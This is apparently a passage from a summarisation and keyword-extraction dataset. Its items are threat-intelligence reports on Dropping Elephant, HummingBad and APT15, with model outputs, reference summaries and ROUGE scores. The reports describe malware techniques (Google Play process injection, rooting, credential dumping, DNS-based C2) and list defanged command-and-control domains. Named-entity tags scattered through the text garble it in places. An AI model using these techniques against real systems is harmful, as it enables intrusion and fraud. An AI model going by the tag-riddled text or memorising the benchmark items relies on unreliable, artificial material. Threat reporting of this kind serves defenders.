. The concentration of visits from [ORG] CN ( People \u2019s [ORG] Republic [ORG] of [ORG] China ) could be for a variety of reasons \u2013 diplomatic staff are visiting these sites from their CN offices , CN academics and analysts are very interested in researching what they believe to be CN focused think tanks , or some of the [ORG] IPs are unknown and not self identifying as bots or scrapers . Regardless , because we were able to determine that multiple targets are diplomatic and governmental entities , these foreign relations efforts are likely to represent the main interest of the attackers . ConclusionCampaigns do not always need to be technically advanced to be successful . In this case , a small group reusing exploit code , some powershell based malware and mostly social engineering has been able to steal sensitive documents and data from victims since [DATE] at [DATE] least [DATE] November [DATE] 2015.Our analysis of the [CARDINAL] C2 server confirmed the high profile of most victims , mainly based in the [NORP] Asian region and specially focused on [NORP] Chinese interests . Actually , some hints suggest the group has been successful enough to have recently expanded its operations , perhaps after proving its effectiveness and the value of the data stolen . This is quite worrying , especially given the fact that [DATE] no [DATE] 0 [DATE] days or advanced techniques were used against such high profile targets . Simply applying software patches will prevent attacks based on old exploits , as well as training in the most basic social engineering attacks . However , it should be noted that in this case Microsoft\u00b4s patch for exploit CVE [CARDINAL] 2014 [DATE] 1761 just warns the user not to allow the execution of the suspicious file.url Dropping Elephant actor - SecurelistDropping Elephant artifacts are detected by [PERSON] Kaspersky [PERSON] Lab products as : [GPE] Exploit . Win32.CVE 2012 0158 . * [GPE] Exploit . [PERSON] MSWord . CVE [CARDINAL] 2014 [DATE] 1761 . * Trojan Downloader . Win32.Genome . * HEUR : Trojan . Win32.GenericAs usual [PERSON] Kaspersky [PERSON] Lab actively collaborates with CERTs and LEAs to notify victims and help to mitigate the threat . If you need more information about this actor , please contact intelreports@kaspersky.comMore information on how [PERSON] Kaspersky [PERSON] Lab technologies protect against such cyberespionage attacks is available on [ORG] Kaspersky 13_Five_Year_Plan_2016 20 1.pps [ORG] Reconciliation_China\u2019s_PLAN.doc url url url url url cn[.]org alfred.ignorelist[.]com url url url url url url ussainbolt.mooo[.]com ussainbolt1.mooo[.]com updatesys.zapto[.]org updatesoft.zapto[.]orgC2 redirectors ( with obfuscated comments)url url url url url url Dropping Elephant actor - SecurelistUpdate : our friends from [ORG] Cymmetria have released their analysis of [ORG] the [ORG] Dropping [ORG] Elephant [ORG] / [ORG] Patchwork [ORG] APT \u2013 make sure to check it as well for more data about the attacks . Related PostsOPERATION DAYBREAKCVE-2016 - 4171 \u2013 ADOBE FLASH ZERO - DAY [DATE] USED [DATE] THREATSurl", "generated_text": "PDF; Dropping Elephant; Chinastrats; Patchwork; the Asian region; spear phishing; emails; attachments; CVE; 2012-0158; 2014-6352; the backdoor; malware samples; PowerShell; detection; malware samples; a website; links; social engineering; targeted attacks; the user; watering hole attacks; emails; Google+; Facebook; Twitter accounts; the attacks; the backdoor; a malware; the malware; a backdoor; malware samples; a Windows file; a Chrome plugin; a system info; data; XOR; a C2 server; the user; time.", "ref_text": "<START-1>The PDF describes research and analysis conducted by Kaspersky Lab on a threat actor group named Dropping Elephant, also known as Chinastrats and Patchwork. The key points are: - Dropping Elephant targets high-profile diplomatic and economic organizations related to China's foreign relations. They use spear phishing and watering hole attacks. - Two main infection vectors are used. One sends a document that phones home when opened, followed by an exploit document to install malware. The other uses a website that requires downloading a document to see full articles, which contains an exploit. - The malware is an AutoIT backdoor that downloads additional components. It steals documents and data like Chrome credentials. - Infrastructure analysis revealed the campaign has been ongoing since at least November 2015. Most victims were in Asia with a focus on Chinese interests. - The group reuses some publicly available tools but combines them effectively with social engineering for successful attacks against high-value targets. - The malware artifacts are not technically advanced, using basic exploits, powershell scripts, and open source tools. Keeping software patched prevents much of the malware. - Attribution analysis tied the group to a threat actor using the alias \"Aleksandr Sirofimov\" which has been linked to previous cybercrime campaigns since 2015. The group may originate from Eastern Europe. In summary, Dropping Elephant is a relatively new but active threat group that has been successfully targeting organizations related to China's foreign relations through simple but cleverly social engineered attacks. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.43765903307888043, "gpt3/lexical/rouge_rouge2": 0.1585677749360614, "gpt3/lexical/rouge_rougeL": 0.28498727735368956, "gpt3/lexical/rouge_rougeLsum": 0.28498727735368956, "gpt3_generated_text": ["The article discusses a relatively new threat actor called Dropping Elephant, also known as Chinastrats and Patchwork, that is targeting high profile diplomatic and economic targets in the Asian region. The actor uses spear phishing and watering hole attacks as its main infection vectors, often sending spear phishing emails with attachments containing malicious payloads that exploit vulnerabilities such as CVE 2012-0158 and CVE 2014-6352. Once the payload is executed, a backdoor is dropped, which downloads additional malware from the attackers' servers. The backdoor also steals documents and data, including the user's Google Chrome credentials. The article also mentions the use of social engineering, such as maintaining Google+, Facebook, and Twitter accounts, to reach wider targets and the use of XOR encryption to hide control server locations. Overall, the article highlights the effectiveness of low investment and ready-made offensive toolsets combined with high quality social engineering in targeted attacks."]}, {"split_name": "val", "sample_id": "val_8", "prompt_text": "Extract the keywords: From [ORG] HummingBad to [ORG] WorseNEW [ORG] DETAILS AND AN IN - DEPTH ANALYSIS OFTHE HUMMINGBAD ANDROID MALWARE CAMPAIGNFor [DATE] five [DATE] months , [ORG] Check [ORG] Point mobile threat researchers had unprecedented , behind - the- scenes access to a group of cybercriminals in [GPE] China . This group created a malware that takes over [ORG] Android devices and generates $ [MONEY] 300,000 per month in fraudulent ad revenue . The group effectively controls an arsenal of over 85 million mobile devices around the world . With the potential to sell access to these devices to the highest bidder , [ORG] Check [ORG] Point researchers say similar malware campaigns may become a trend . In [DATE] February [DATE] 2016 , [ORG] Check [ORG] Point researchers [ORDINAL] first discovered [ORG] HummingBad , a malware that establishes a persistent rootkit on [ORG] Android devices , generates fraudulent ad revenue , and installs additional fraudulent apps . Since then , researchers saw an increasing number of instances in the wild and have traced the attack campaign \u2019s source . This investigation uncovered critical insights on how attackers conduct mobile malware campaigns : Figure [CARDINAL] 1 : Data from [ORG] Check [ORG] Point gateways detailing the number ofHummingBad instances researchers have seen in the wild.\u2022 The [ORG] HummingBad campaign runs alongside a legitimate advertising analytics business , sharingtheir technology and resources , enabling it to control [MONEY] tens [MONEY] of [MONEY] millions of [ORG] Android devices\u2022 The campaign generates $ [MONEY] 300,000 a month ; proving attacks can achieve financial self - sufficiencyFinancial gain is just the tip of the iceberg:\u2022 The group tries to root [CARDINAL] thousands of devices every day and is successful in [CARDINAL] hundreds of attempts \u2022 With these devices , a group can create a botnet , carry out targeted attacks on businesses or government agencies , and even sell the access to other cybercriminals on the black market\u2022 Any data on these devices is at risk , including enterprise data on those devices that serve dualpersonal and work purposes for end usersAccessing these devices and their sensitive data creates a new and steady steady stream of revenue for cybercriminals . Emboldened by financial and technological independence , their skillsets will advance \u2013 putting end users , enterprises , and government agencies at risk. \u00a9 [DATE] 2016 Check Point Software Technologies Ltd. All rights reserved | P. 1Meet the Yingmob Following the command and control ( [ORG] C&C ) servers used by the original [ORG] HummingBad samples detected in [DATE] February , researchers found the attackers \u2019 repositories . These repositories belong to [NORP] Yingmob , a [NORP] Chinese mobile ad server While other research firms associate [NORP] Yingmob with an iOS malware called [PRODUCT] Yispecter , [PRODUCT] Check [PRODUCT] Point researchers determined that the same group is also behind [ORG] HummingBad : \u2022Yispecter uses Yingmob \u2019s enterprise certificates to install itself on [GPE] devices\u2022 [ORG] HummingBad and [PRODUCT] Yispecter share C&Cserver addresses\u2022 [ORG] HummingBad repositories contain QVODdocumentation , an [NORP] iOS porn player targeted by [DATE] Yispecter\u2022 Both install fraudulent apps to gain revenue . Yingmob has several teams developing legitimate tracking and ad platforms . The team responsible for developing the malicious components is [ORG] the \u201c [ORG] Development [ORG] Team [ORG] for [ORG] Overseas [ORG] Platform \u201d which includes [CARDINAL] four groups with a total of [CARDINAL] 25 employees . This team sits in [FAC] Level [FAC] 5 , [GPE] Xingdu [GPE] Plaza , [CARDINAL] 73 [PERSON] Beiqu [PERSON] Rd . , [GPE] Yuzhong , [GPE] Chongqing , [GPE] China . The team has [CARDINAL] three development projects : \u2022 Eomobi : [ORG] HummingBad malicious components \u2022 Hummer Offers : Ad server analytics platform \u2022 Hummer Launcher : Ad server Androidapplication package ( APK)The development team has [CARDINAL] six product lines : [CARDINAL] 1 . Eobomi [CARDINAL] 2 . [PERSON] Hummer launcher [CARDINAL] 3 . [ORG] Root [ORG] Software [ORG] Development [ORG] Kit ( [ORG] SDK ) [CARDINAL] 4 . [PERSON] Hummer [PERSON] Offers [PERSON] 5 . MAT [CARDINAL] 6 . UnitemobiFigure [CARDINAL] 2 : Yingmob 's Offices In ChongqingFigure 3 : Seating Plan of Yingmob 's Offices In ChongqingFigure 4 : Yingmob 's Organization \u00a9 2016 Check Point Software Technologies Ltd. All rights reserved | P. 2HummingBad Takes Flight Worldwide Analysis of the [ORG] HummingBad code revealed that it sends notifications to [GPE] Umeng , a tracking and analytics service from which the attackers manage the campaign . Further analysis of [LOC] Yingmob \u2019s [GPE] Umeng account revealed the extent of the [ORG] HummingBad campaign . The control panel registers [CARDINAL] almost [CARDINAL] 200 apps , most of which are different variations of the same core apps . Check Point researchers suspect [PERCENT] about [PERCENT] 25 % of these apps are malicious . All combined , the campaign includes [CARDINAL] nearly [CARDINAL] 85 [CARDINAL] million devices . [ORG] Active [ORG] Times Cumulative userNew userActive userToday [DATE] Yesterday [DATE] Yesterday independent userAccording to the interface , activity began in [DATE] August [DATE] 2015 , and is seen below in the graph showing cumulative users over time : Figure [CARDINAL] 2 : [ORG] Overall [ORG] Statistics of the Umeng InterfaceFigure 6 : Cumulative Users Over Time \u00a9 2016 Check Point Software Technologies Ltd. All rights reserved | P. 3After analyzing most of the apps on the dashboard , the research team estimates that [CARDINAL] nearly [CARDINAL] 10 [CARDINAL] million users are using these malicious apps . While victims are spread worldwide , [GPE] India and [GPE] China take the lead . The top [CARDINAL] 20 countries with infected devices have [CARDINAL] more [CARDINAL] than [CARDINAL] 100,000 victims each . [GPE] Malaysia , [CARDINAL] 113096Ukraine , 117287Algeria , [DATE] 130129Colombia , [DATE] 137131Vietnam , [DATE] 137328Egypt , 140007Romania , [DATE] 147632 Nepal , [DATE] 172327Pakistan , [DATE] 188758Russia , [DATE] 207940Bangladesh , [DATE] 209706Thailand , 260128United States , [DATE] 286800Mexico , 325208Brazil , 366566China , [DATE] 1606384India , [DATE] 1352772Turkey , [CARDINAL] 448285Indonesia , [CARDINAL] 489336Philippines , 520901Figure [CARDINAL] 7 : Top [CARDINAL] 20 Targeted Countries \u00a9 2016 Check Point Software Technologies Ltd. All rights reserved | P. 4HummingBad targets users of all [ORG] Android [ORG] Operating [ORG] System ( OS ) versions , as seen below : Figure [CARDINAL] 8 : Victim Heat MapMarshmallow1%Ice Cream Sandwich2%Victims byAndroid VersionLollipop7%Jelly Bean40%KitKat 50%Figure [CARDINAL] 9 : [NORP] Victims By Android OS \u00a9 2016 Check Point Software Technologies Ltd. All rights reserved [PERSON] | [PERSON] P. 5It \u2019s All About Making Money \u2013 For Now One of the interesting aspects of this campaign is the economic impact on users and advertisers . Abusing many ad server software development kits ( SDKs ) and defrauding them for revenue , [ORG] HummingBad uses the entire spectrum of paid events for its operation , including displaying ads , creating clicks , and installing fraudulent apps . These illegitimate tactics generate more revenue for [ORG] HummingBad developers than playing by the rules . Developers track the effectiveness of the apps in each category with the \u201c Developer Defined Events \u201d section in [LOC] Yingmob \u2019s [GPE] Umeng interface . Each [GPE] Umeng can modify the apps to contain whichever event they wish . In the case of [ORG] HummingBad , most fields relate to ad fraud . Our research team extracted the following data from the campaign:\u2022 The apps display [CARDINAL] more [CARDINAL] than [CARDINAL] 20 [CARDINAL] million advertisements per day \u2022Yingmob achieves a high click rate of 12.5 % with illegitimate methods , resulting in over [CARDINAL] 2.5 [CARDINAL] million clicks per day\u2022 [ORG] HummingBad installs [CARDINAL] more [CARDINAL] than [CARDINAL] 50,000 fraudulent apps per dayThis translates to significant revenues : Yingmob \u2019s average revenue per clicks ( [ORG] RPC ) is USD $ 0.00125\u2022 \u2022 Accumulated revenue from clicks per day reaches [MONEY] more [MONEY] than $ 3,000 \u2022 The rate for each fraudulent app is $ [MONEY] 0.15 with accruing over $ [MONEY] 7,500 per day \u2022Yingmob makes $ [MONEY] 10,000 per day or [MONEY] about $ [MONEY] 300,000 a month . While profit is powerful motivation for any attacker , [GPE] Yingmob \u2019s apparent self - sufficiency and organizational structure make it well - positioned to expand into new business ventures , including productizing the access to the [CARDINAL] 85 [CARDINAL] million [ORG] Android devices it controls . This alone would attract a whole new audience \u2013 and a new stream of revenue \u2013 for [NORP] Yingmob . Quick , easy access to sensitive data on mobile devices connected to enterprises and government agencies around the globe is extremely attractive to cybercriminals and hacktivists . Without the ability to detect and stop suspicious behavior , these [CARDINAL] millions of [ORG] Android devices and the data on them remain exposed today. \u00a9 2016 Check Point Software Technologies Ltd. All rights reserved | P. 6Simulate click : Detailed Analysis : How HummingBad Works The [ORDINAL] first infection method the [ORG] Check [ORG] Point research team saw was a drive - by download attack , and the Check Point ThreatCloud indicates some adult content sites served malicious payloads too . [ORG] HummingBad uses a sophisticated , multi - stage attack chain with [CARDINAL] two main components . The [ORDINAL] first component attempts to gain root access on a device with a rootkit that exploits multiple vulnerabilities . If successful , attackers gain full access to a device . If rooting fails , a [ORDINAL] second component uses a fake system update notification , tricking users into granting [ORG] HummingBad system - level permissions . Irrespective of whether rooting is successful , [ORG] HummingBad downloads as many fraudulent apps to the device as possible . The malicious apps in the [ORG] HummingBad campaign are made of a mix of several malicious components , many of which have variations with the same functionality . In some cases , the malicious components are dynamically downloaded onto a device after the infected app is installed . The [ORDINAL] first malicious component , known as [ORG] SSP , displays illegitimate ads and installs fraudulent apps . It is triggered by [CARDINAL] four events : device boot , screen turning on or off , detection that a user is present , and any change in connectivity . When triggered , [ORG] SSP starts a service named [PERSON] Se , which initiates the malicious logic and starts the advertisement networks used by the app . Different variations of [ORG] HummingBad use different ad networks such as [ORG] Mobvista , [ORG] Cheetah , [GPE] Apsee , or [FAC] Startapp . SSP starts a timer that schedules a [ORG] LockTask execution [TIME] every [TIME] 10 [TIME] seconds . If all conditions ( such as time delay , internet connection , and settings received from the server ) are met , [ORG] LockTask restarts the [PERSON] Se server and launches the [ORG] MainActivity process , activating the malicious payload . Once the [ORG] MainActivity process starts , the malware begins to display ad banners with a \u201c close \u201d button . The malware blocks any attempt to return to the home screen or go back , forcing the user to click on the banner . If the user clicks the \u201c close \u201d button , the malware imitates a click on the banner itself . Once the banner is clicked , SSP sends a request to a server that returns a link to an [ORG] Android application kit ( APK ) . SSP then downloads this APK from the server. \u00a9 [CARDINAL] 2016 Check Point Software Technologies Ltd. All rights reserved | P. 7Show close button : Once the [ORG] APK is downloaded , the app checks if the device is rooted by any of the other components . If the device is rooted , it installs the APK silently ; if not , SSP attempts installation with a user dialog . Once installed , [ORG] SSP launches the [ORG] APK information received from the server to imitate an installation from GP and acquire revenue from the ad To receive updates and send reports , SSP retrieves the command and control ( [ORG] C&C ) domain from [ORG] a [ORG] JavaScript [ORG] Object [ORG] Notation ( JSON ) file downloaded from d1qxrv0ap6yf2e.cloudfront[.]net / domain / [PERSON] xxx.json . Possible values are:\u2022 \u2022{\"id\":3,\"name\":\"CAP\",\"master\":\"032o[.]com\",\"slave\":\"032n[.]com \" } { \" id\":4,\"name\":\"SSP&CCSDK\",\"master\":\"guangbom[.]com\",\"slave\":\"ssppsspp[.]com \" } { \" id\":5,\"name\":\"asdf\",\"master\":\"asdf\",\"slave\":\"asdf \" } //I think { \" id\":6,\"name\":\"efwe\",\"master\":\"gwsgs\",\"slave\":\"dgss\"}//it 's unused { \" id\":7,\"name\":\"1\",\"master\":\"1\",\"slave\":\"1 \" } //and this { \" id\":8,\"name\":\"CAP - DW\",\"master\":\"ccaa100[.]com\",\"slave\":\"ccaa200[.]com \" } { \" id\":9,\"name\":\"SSP - DW\",\"master\":\"cscs100[.]com\",\"slave\":\"cscs200[.]com \" } { \" id\":11,\"name\":\"HM - JK\",\"master\":\"hmapi[.]com\",\"slave\":\"eoapi[.]com \" } { \" id\":12,\"name\":\"-\",\"master\":\"ma2.heshan88[.]com\",\"slave\":\"sl2.heshan88[.]com \" } { \" id\":13,\"name\":\"-\",\"master\":\"ma2.heshan88[.]com\",\"slave\":\"sl2.heshan88[.]com \" } { \" id\":14,\"name\":\"-\",\"master\":\"ma2.heshan88[.]com\",\"slave\":\"sl2.heshan88[.]com \" } { \" id\":15,\"name\":\"iadpush\",\"master\":\"ma2.lb0408[.]com\",\"slave\":\"sl2.lb0408[.]com \" } { \" id\":16,\"name\":\"1mob - fudian\",\"master\":\"ma2.heshan88[.]com\",\"slave\":\"sl2.heshan88[.]com \" } { \" id\":17,\"name\":\"QS\",\"master\":\"aa0ad[.]com\",\"slave\":\"aa0ab[.]com \" } { \" id\":18,\"name\":\"1mob - xin\uff08/BDSDK \" , \" master\":\"ma2.heshan88[.]com\",\"slave\":\"sl2.heshan88[.]com\"} \u00a9 [CARDINAL] 2016 Check Point Software Technologies Ltd. All rights reserved | P. 8Google Play Process Injection SSP injects a library into the process of Google Play . By doing this , the malware can then imitate clicks on install / buy / accept button inside Google Play . This injection determines if the required button is active and understands which window of Google Play is displayed in the The malware injects the native library into the Google Play process using the well - known ptrace approach . SSP uses the ptrace system call to control other apps , reading and writing memory and registers . By combining calls of ptrace , it loads its library into the memory of other processes and calls . The injected library dynamically loads dex - code ( compiled [PERSON] Java code for [ORG] Android ) into [DATE] the process. \u00a9 [DATE] 2016 Check Point Software Technologies Ltd. All rights reserved | P. 9Loaded dex code starts the service in the context of the Google Play app . Periodically scanning views inside Google Play , it imitates clicks on install / buy / accept buttons when they appear . [PRODUCT] RightCore [PRODUCT] Present in the [ORDINAL] first sample of [ORG] HummingBad found in [DATE] February [DATE] 2016 , the [PRODUCT] RightCore component contains the malware \u2019s rooting functionality . Some samples include this payload in their assets , while others download it from the server . The infected app checks whether the device is rooted . If the device is not rooted , the parent malware decrypts [PRODUCT] RightCore ( every character is [PERSON] XOR encrypted against [CARDINAL] 85 ) . Depending on the version , [ORG] RightCore either downloads a pack of exploits from the server or decrypts them from its own assets . Then , it analyzes the device \u2019s configurations to choose best how to run the exploits . If the exploit is successful , the app decodes a payload from its assets and attempts a quiet installation . Then , it downloads additional fraudulent apps , installing them silently . Though copied from other developers , these exploits remain effective nonetheless . The root binaries are named ipm and ppm instead of the normal su , possibly to avoid detection . According to the [GPE] Umeng interface , the [ORG] HummingBad campaign tries to root [CARDINAL] thousands of devices [DATE] every [DATE] day , with [CARDINAL] hundreds of these attempts successful . The [ORG] CAP component installs fraudulent apps using elaborate techniques . When [ORG] CAP launches on a device it decrypts module_encrypt.jar from its assets and dynamically loads code containing the main malware functionality . From its assets , it decrypts and runs a native daemon binary . This binary then periodically executes a command to wake up the app . On every broadcast , [ORG] CAP checks for changes in data . If it detects a change , the app clears all pending downloads , notifications , and events , and checks several parameters about its own activity ( time from start , number of requests sent before ) . If the parameters meet the preset conditions , [ORG] CAP sends a request to the server to receive the fraudulent app. \u00a9 2016 Check Point Software Technologies Ltd. All rights reserved | P. [CARDINAL] 10Once CAP receives the payload , it attempts installation \u2013 silently if the device is rooted , or by initiating user interaction if it is not . This mechanism allows hackers to control the quantity of apps installed [DATE] each [DATE] day , maintaining a low profile and Periodically , the app sends statistics about the plugin \u2019s activities to the server and checks for updates . These statistics include the identifications of actions , such as whether a device is rooted , and if so , when it occurred . Fake IMEI injection [ORG] CAP creates a fake \u201d unique \u201d 15- digit [ORG] International [ORG] Mobile [ORG] Station [ORG] Equipment [ORG] Identity ( IMEI ) number , imitating the activity of additional devices and conducting further fraud . In doing so , [ORG] CAP installs the same app twice on the same device , but receives payment for installing it on [CARDINAL] two different devices . [ORG] CAP injects a library into the com.android.phone or android.internal.telephony process and calls internal classes of this process to set fake [WORK_OF_ART] IMEI [WORK_OF_ART] Clicking [WORK_OF_ART] Simulation [WORK_OF_ART] in [WORK_OF_ART] Google [WORK_OF_ART] Play [WORK_OF_ART] CAP conducts an \" external \u201d clicking simulation for Google Play by opening an app in Google Play that was proposed by an advertisement. \u00a9 [CARDINAL] 2016 Check Point Software Technologies Ltd. All rights reserved | P. 11Once Google Play is open , the malware simulates the sequence of screen clicks that tap the \" Install \" and \" Accept \" buttons to claim the reward for a successful referral . To obtain the coordinates of the Google Play button , the malware dumps its layout using a user interface ( [ORG] UI ) automation application program interface ( API ) . The click imitation is performed by then executing the \" input tap X Y \" utility with the coordinates of the [LOC] Yingmob may be the [ORDINAL] first group to have its high degree of organization and financial self - sufficiency exposed to the public , but it certainly wo n\u2019t be the last . Check Point believes this dangerous trend will escalate as other groups learn from [NORP] Yingmob and find new ways to achieve the independence they need to launch larger and more sophisticated attack campaigns in the future. \u00a9 [DATE] 2016 Check Point Software Technologies Ltd. All rights reserved | P. [CARDINAL] 12Appendix\u2022 Com.andr0id[.]cmvchinme \u2022 Com.swiping[.]whale [PERSON] \u2022 [PERSON] Com.andr0id[.]cmvchinmf [PERSON] \u2022com.quick[.]launcherSHA-256", "generated_text": "Check Point; a group; Chinese; HummingBad; Android devices; $ 300,000; ad revenue; the malware; devices; use; tens; million; Android devices; Yingmob; ad platform; the malware; apps; the malware; dozens; dozens; attempts; hundreds; Android malware campaigns; ad campaigns; the highest bidder; the mobile malware; interest; the highest bidder; similar malware campaigns; a trend; the source; the attackers; a payload; the most sophisticated malware.", "ref_text": "<START-1>The report provides an in-depth analysis of HummingBad, a sophisticated malware campaign targeting Android devices. Researchers attribute the campaign to Yingmob, a Chinese mobile ad network company. Yingmob runs the malware operation alongside its legitimate ad business, sharing infrastructure and resources. This allows the malware campaign to infect over 85 million devices and generate $300,000 per month in fraudulent ad revenue. The malware uses rooting exploits and social engineering to gain system-level access on devices. It then installs fraudulent apps to create fake clicks and impressions. Yingmob tracks and manages the malware using a command and control platform. With control of over 85 million devices, Yingmob could potentially sell access to the highest bidder. The data and capabilities of compromised devices could be very valuable to cybercriminals. The report concludes by warning that as attackers become more independent and sophisticated like Yingmob, larger and more dangerous mobile malware campaigns will emerge. The findings highlight the increasing threat that mobile malware poses to both consumers and enterprises. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4879725085910653, "gpt3/lexical/rouge_rouge2": 0.1453287197231834, "gpt3/lexical/rouge_rougeL": 0.27491408934707895, "gpt3/lexical/rouge_rougeLsum": 0.27491408934707895, "gpt3_generated_text": ["This article provides an in-depth analysis of the HummingBad Android malware campaign, which has generated $300,000 per month in fraudulent ad revenue. Researchers from Check Point had access to the group behind the malware and discovered that it runs alongside a legitimate advertising analytics business, allowing it to control tens of millions of Android devices. The group tries to root thousands of devices every day and is successful in hundreds of attempts, potentially creating a botnet for targeted attacks or selling access to other cybercriminals. The group behind HummingBad is also responsible for the iOS malware Yispecter. The article emphasizes the financial gain and the risk to sensitive data associated with these devices, highlighting the need for increased security measures."]}, {"split_name": "val", "sample_id": "val_9", "prompt_text": "Extract the keywords: APT15 is alive and strong : An analysis of [ORG] RoyalCli and RoyalDNS In [DATE] May [DATE] 2017 , [ORG] NCC [ORG] Group 's Incident [ORG] Response team reacted to an ongoing incident where our client , which provides a range of services to [ORG] UK [ORG] Government , su\ufb00ered a network compromise involving the advanced persistent threat group APT15.APT15 is also known as , [ORG] Ke3chang , [ORG] Mirage , Vixen Panda [PERSON] GREF and Playful Dragon . A number of sensitive documents were stolen by the attackers during the incident and we believe APT15 was targeting information related to [GPE] UK government departments and military technology . APT15 expands its arsenal During our analysis of the compromise , we identi\ufb01ed new backdoors that now appear to be part of APT15 's toolset . The backdoor BS2005 - which has traditionally been used by the group - now appears alongside the additional backdoors [ORG] RoyalCli and [PRODUCT] RoyalDNS . The [ORG] RoyalCli backdoor appears to be an evolution of [PRODUCT] BS2005 and uses familiar encryption and encoding routines . The name [ORG] RoyalCli was chosen by us due to a debugging path left in the binary : c:\\users\\wizard\\documents\\visual studio [CARDINAL] 2010\\Projects\\RoyalCli\\Release\\RoyalCli.pdbRoyalCli and [PRODUCT] BS2005 both communicate with the attacker 's command and control ( C2 ) through Internet Explorer ( IE ) by using the [ORG] COM interface IWebBrowser2 . Due to the nature of the technique , this results in [CARDINAL] C2 data being cached to disk by the IE process ; we 'll get to this later . Analysis of the domains and [ORG] IP address infrastructure used by APT15 identi\ufb01ed a number of similar possible domains , shown at the bottom of the post . These appeared to be hosted on either [ORG] Linode or Google Cloud , with a preference for using the [ORG] ASN AS63949 . All of the backdoors identi\ufb01ed - excluding RoyalDNS - required APT15 to create batch scripts in order to install its persistence mechanism . This was achieved through the use of a simple Windows run key . We believe that APT15 could have employed this technique in order toevade behavioural detection , rather than due to a lack of sophistication or development capability . Additional tools were recovered during the incident , including a network scanning / enumeration tool , the archiving tool WinRAR and a bespoke [ORG] Microsoft [ORG] SharePoint enumeration and data dumping tool , known as ' spwebmember ' . spwebmember was written in [ORG] Microsoft .NET and includes hardcoded values for client project names for data extraction . The tool would connect to the [ORG] SQL [ORG] SharePoint database and issue a query to dump all data from the database to a temporary \ufb01le a\ufb03xed with ' spdata ' . The group also used keyloggers and their own .NET tool to enumerate folders and dump data from [ORG] Microsoft [ORG] Exchange mailboxes . APT15 was also observed using [PERSON] Mimikatz to dump credentials and generate [LOC] Kerberos golden tickets . This allowed the group to persist in the victim 's network in the event of remediation actions being undertaken , such as a password reset . APT15 lives o\ufb00 the land Upon ejection from the network , APT15 managed to regain access [DATE] a [DATE] couple [DATE] of [DATE] weeks [DATE] later via the corporate VPN solution with a stolen [ORG] VPN certi\ufb01cate , which they had extracted from a compromised host . This time , APT15 opted for a [ORG] DNS based backdoor : RoyalDNS . The persistence mechanism used by RoyalDNS was achieved through a service called ' [WORK_OF_ART] Nwsapagent ' . C2 of this backdoor was performed using the [ORG] TXT record of the [ORG] DNS protocol . C2 was communicating with the domain ' andspurs[.]com ' . We mentioned earlier that due to the nature of the IE injection technique used by the HTTP- based backdoors , a number of [CARDINAL] C2 commands were cached to disk . We were able to recover these \ufb01les and reverse engineer the encoding routine used by the backdoors in order to uncover the exact commands executed by the attacker . In total , we were able to recover [CARDINAL] more [CARDINAL] than [CARDINAL] 200 commands executed by the attacker against the compromised hosts and were able to gain a clear insight into the attacker 's TTPs . Our decode scripts can be found on our [PERSON] Github page : url ( url Analysis of the commands executed by APT15 rea\ufb03rmed the group 's preference to ' live o\ufb00 the land ' . They utilised Windows commands in order to enumerate and conduct reconnaissance activities such as tasklist.exe , ping.exe , netstat.exe , net.exe , systeminfo.exe , ipcon\ufb01g.exe and bcp.exe . Lateral movement was conducted through by a combination of net command , mounting the C$ share of hosts and manually copying \ufb01les to or from compromised hosts . APT15 then used a tool known as [ORG] RemoteExec ( similar to [ORG] Microsoft 's Psexec ) in order to remotely execute batch scripts and binaries . During our analysis of the decoded attacker commands we noticed a typographical mistake , shown below in the folder name ' systme ' . This indicates that a human operative was executing commands on a command line style interface , rather than an automated or [ORG] GUI process . IOCs through the use of these backdoors . These , along with [ORG] YARA signatures for the backdoors identi\ufb01ed , can be found in the [GPE] Github repository linked above . Domains The [ORG] RoyalCli backdoor was attempting to communicate to the following domains : [ORG] News.memozilla[.]org video.memozilla[.]orgThe BS2005 backdoor utilised the following domains for [CARDINAL] C2 : Run.linodepower[.]com Singa.linodepower[.]com log.autocount[.]orgRoyalDNS backdoor was seen communicating to the domain : andspurs[.]comPossible linked APT15 domains include : Micakiz.wikaba[.]org dnsapp[.]infoPublished date : [DATE] 10 [DATE] March [DATE] 2018Written by : [PERSON] Rob Smallridge(url By Service Cyber Security Risk Management & Governance Website Performance CareersFilter By [DATE] Date [DATE] 2018 ( /uk / about - us / newsroom - and - events / blogs/?Year=2018)March ( 5 ) ( /uk / about - us / newsroom - and - events / blogs/?Year=2018&Month=3 ) [DATE] February ( 7 ) ( /uk / about - us / newsroom - and - events / blogs/?Year=2018&Month=2 ) [DATE] January ( [CARDINAL] 10 ) ( /uk / about - us / newsroom - and - events / blogs/?Year=2018&Month=1)2017 ( /uk / about - us / newsroom - and - events / blogs/?Year=2017 ) [DATE] 2016 ( /uk / about - us / newsroom - and - events / blogs/?Year=2016 ) [DATE] 2015 ( /uk / about - us / newsroom - and - events / blogs/?Year=2015 ) [DATE] 2014 ( /uk / about - us / newsroom - and - events / blogs/?Year=2014 ) [DATE] 2013 ( /uk / about - us / newsroom - and - events / blogs/?Year=2013 ) [DATE] 2012 ( /uk / about - us / newsroom - and - events / blogs/?Year=2012 ) [DATE] 2011 ( /uk / about - us / newsroom - and - events / blogs/?Year=2011 ) [DATE] 2010 ( /uk / about - us / newsroom - and - events / blogs/?Year=2010)Call us on : +44(0)161 820 [DATE] 6646 ( [ORG] tel:+441618206646)Newsroom [ORG] & [ORG] EventsIn the media ( /uk / about - us / newsroom - and - events / in - the - media/ ) News ( /uk / about - us / newsroom - and - events / news/ ) Press Releases ( /uk / about - us / newsroom - and - events / press - releases/ ) Events ( /uk / about - us / newsroom - and - events / events/ ) [PERSON] Blogs ( /uk / about - us / newsroom - and - events / blogs/ ) About Us History ( /uk / about - us / what - we - do / history/ ) [ORG] Board [ORG] & [ORG] Senior [ORG] Management ( /uk / about - us / what - we - do / board - and - executive- committee/ ) Careers ( /uk / about - us / careers/ ) Resources ( /uk / about - us / resources/ ) [PERSON] O\ufb03ce [PERSON] Locations ( /uk / about - us / what - we - do / o\ufb03ce - locations/ ) \u00a9 [DATE] 2018 [ORG] NCC [ORG] Group . All rights reserved . Investor Relations Share Price ( /uk / about - us / investor - relations / share - price/ ) Results & Presentations ( /uk / about - us / investor - relations / results - and - presentations/ ) Stock Exchange Announcements ( /uk / about - us / investor - relations / stock - exchange- [ORG] Terms [ORG] & [ORG] Conditions ( /uk / about - us / terms - and - conditions/ ) Privacy Policy ( /uk / about - us / privacy - policy/ ) Cookie Policy 